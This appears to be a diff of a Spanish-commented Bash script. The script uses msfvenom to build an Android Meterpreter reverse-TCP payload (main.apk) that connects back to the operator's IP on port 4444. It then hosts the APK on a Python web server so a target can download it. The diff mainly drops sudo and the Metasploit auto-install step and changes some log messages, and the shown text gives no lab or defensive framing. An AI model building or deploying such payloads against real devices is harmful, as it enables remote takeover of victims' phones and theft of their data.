@@ -27,10 +27,6 @@ while [[ $# -gt 0 ]]; do
             usage
             exit 0
             ;;
-        *)
-            usage
-            exit 1
-            ;;
     esac
 done
 
@@ -47,32 +43,24 @@ fi
 # Si no se proporcionó un puerto, usar un valor predeterminado
 if [[ -z "$PORT" ]]; then
     # Eliminamos los procesos que estén utilizando el puerto 8080
-    sudo fuser -k 4444/tcp &>/dev/null
+    fuser -k 4444/tcp &>/dev/null
     PORT=4444
-fi
-
-# Si no tenemos instalado msfvenom lo instalamos
-if ! command -v msfvenom &> /dev/null; then
-    print_red "msfvenom no está instalado. Instalándolo..."
-    sudo apt-get install -y metasploit-framework
-    if [ $? -ne 0 ]; then
-        print_red "Error al instalar msfvenom."
-        exit 1
-    fi
 fi
 
 # Eliminar si ya dispongo de un archivo main.apk
 if [ -f main.apk ]; then
-    print_red "El archivo main.apk ya está creado, eliminando..."
+    print_cyan "El archivo main.apk ya está creado, eliminando..."
     # Eliminar el archivo main.apk
     rm main.apk
 fi
 
-echo "Generando payload..."
-# Generar el payload de Android con msfvenom, en ../main.apk
+print_cyan "Generando payload..."
+# Generar el payload de Android con msfvenom, en ./main.apk
+echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
+
 if [ $? -eq 0 ]; then
-    print_green "Payload generado exitosamente: main.apk, LHOST=$LOCAL_IP, LPORT=$PORT"
+    print_green "Payload generado exitosamente"
 else
     print_red "Error al generar el payload."
     exit 1
@@ -80,8 +68,8 @@ fi
 
 # Verificar si tenemos instalado Python 3
 if ! command -v python3 &> /dev/null; then
-    print_red "Python 3 no está instalado. Instalándolo..."
-    sudo apt-get install -y python3
+    print_red "Python 3 no está instalado instalándolo..."
+    apt install -y python3
     if [ $? -ne 0 ]; then
         print_red "Error al instalar Python 3."
         exit 1
@@ -93,11 +81,11 @@ PORT_PYTHON=8000
 # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
 if nc -z 127.0.0.1 $PORT_PYTHON &> /dev/null; then
     # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
-    print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
-    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
+    print_cyan "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
+    fuser -k $PORT_PYTHON/tcp &>/dev/null
 elif ss -tuln | grep -q ":$PORT_PYTHON "; then
     print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
-    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
+    fuser -k $PORT_PYTHON/tcp &>/dev/null
 fi
 
 # Creamos un servidor HTTP para descargar el APK con Python 3
@@ -114,6 +102,7 @@ fi
 # Verificar si el archivo main.apk se generó correctamente
 if [ -f main.apk ]; then
     print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT_PYTHON/main.apk"
+    print_green "O desde la web http://$LOCAL_IP:$PORT_PYTHON"
 else
     print_red "Error: main.apk no se generó correctamente."
     exit 1
